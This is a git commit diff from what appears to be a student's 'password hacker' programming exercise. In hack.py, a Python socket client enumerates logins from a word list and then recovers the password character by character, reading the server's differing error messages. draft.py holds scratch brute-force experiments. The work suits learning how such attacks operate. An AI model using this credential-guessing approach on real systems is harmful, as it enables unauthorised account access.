377427c021438664c3acf58a6b8fbc8e1188e3f2
bushuev-alex <bushuev-alex@mail.ru>
2022-01-23 23:56:34 +0700

    Fourth stage passed.

--- task/hacking/draft.py
+++ task/hacking/draft.py
@@ -1,15 +1,48 @@
-import itertools
+import json
+
+
+def get_login():
+    with open("logins.txt", "r") as login_file:
+        for line in login_file:
+            js_data = json.dumps({"login": f"{line.strip()}", "password": f"{''}"})
+            yield js_data
+
+
+my_gen = get_login()
+print(json.loads(next(my_gen))['login'])
+print(next(my_gen))
+print(next(my_gen))
+
+
+
+"""import itertools
 from string import digits, ascii_lowercase
 data = ascii_lowercase + digits
-import os
+import os"""
 
-my_gen = itertools.product([['g', 'G'], ['o', 'O'], ['l', 'L'], ['f', 'F']])
+"""a = itertools.product([1,2], [3,4], [5,6])
+for i in a:
+    print(i)"""
 
+"""my_gen = itertools.product([['g', 'G'], ['o', 'O'], ['l', 'L'], ['f', 'F']])
 for let in my_gen:
-    print(next(let))
+    print(next(let))"""
 
+"""def itet():
+    word = 'word'
+    upper_lower_list = []
+    if not word.strip().isdigit():
+        for letter in word.strip():
+            upper_lower_list.append([letter.upper(), letter.lower()])
+        res = itertools.product(*upper_lower_list)
+        for item in res:
+            yield ''.join(item)
 
-
+my_itet = itet()
+print(next(my_itet))
+print(next(my_itet))
+print(next(my_itet))
+print(next(my_itet))"""
 
 """def numbers():
     for n_step in range(4):
@@ -34,7 +67,7 @@ gen_line('word')"""
 
 """with open("passwords.txt", "r") as file:
     text = file.readlines()"""
-        
+
 """for i in 'word':
     item = itertools.combinations(i + i.capitalize(), 2)
     for j in item:
--- task/hacking/hack.py
+++ task/hacking/hack.py
@@ -2,6 +2,7 @@ import socket
 import argparse
 from string import digits, ascii_lowercase
 import itertools
+import json
 
 
 class Hacktool:
@@ -9,23 +10,26 @@ class Hacktool:
     def __init__(self, data):
         self.hostname = data[0]
         self.port = int(data[1])
-        self.password = None
+        self.login = None
+        self.password = ''
         self.address = (self.hostname, self.port)
         self.my_socket = None
         self.recv_data = None
         self.psw_base = []
+        self.abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
 
     def connect_to_socket(self):
         self.my_socket = socket.socket()
         self.my_socket.connect(self.address)
 
-    def send_data(self, pasw):
-        mes = pasw.strip().encode()
+    def send_data(self, log_pasw):
+        mes = log_pasw.encode()
         self.my_socket.send(mes)
 
     def receive(self):
         response = self.my_socket.recv(1024)
-        self.recv_data = response.decode()
+        js_recieved = response.decode()
+        self.recv_data = json.loads(js_recieved)
 
     def close(self):
         self.my_socket.close()
@@ -44,6 +48,39 @@ class Hacktool:
                 for item in my_gen:
                     yield ''.join(item)
 
+    def read_log_file(self):
+        with open("logins.txt", "r") as login_file:
+            for line in login_file:
+                js_data = json.dumps({"login": f"{line.strip()}", "password": f"{''}"})
+                yield js_data
+
+    def get_fit_login(self):
+        my_gen = self.read_log_file()
+        while True:
+            login = next(my_gen)
+            # word = next(words)
+            self.send_data(login)
+            self.receive()
+            if self.recv_data['result'] == "Wrong password!":
+                self.login = json.loads(login)['login']
+                break
+
+    def get_fit_pass(self):
+        for letter in self.abc:
+            self.psw_base.append(str(letter))
+            psw = ''.join(self.psw_base)
+            js_data = json.dumps({"login": f"{self.login}", "password": f"{psw}"})
+            self.send_data(js_data)
+            self.receive()
+            if self.recv_data['result'] == "Exception happened during login":
+                return False
+            elif self.recv_data['result'] == "Connection success!":
+                self.password = psw
+                return True
+            elif self.recv_data['result'] == "Wrong password!":
+                self.psw_base.pop()
+                continue
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument("hostname", default='localhost')
@@ -55,12 +92,12 @@ params = [args.hostname, args.port]
 
 my_hacktool = Hacktool(params)
 my_hacktool.connect_to_socket()
-words = my_hacktool.lower_upper_words()
+# words = my_hacktool.lower_upper_words()
+my_hacktool.get_fit_login()
+
 while True:
-    word = next(words)
-    my_hacktool.send_data(word)
-    my_hacktool.receive()
-    if my_hacktool.recv_data == "Connection success!":
-        print(word)
+    if my_hacktool.get_fit_pass():
         break
+
+print(json.dumps({"login": f"{my_hacktool.login}", "password": f"{my_hacktool.password}"}))
 my_hacktool.close()
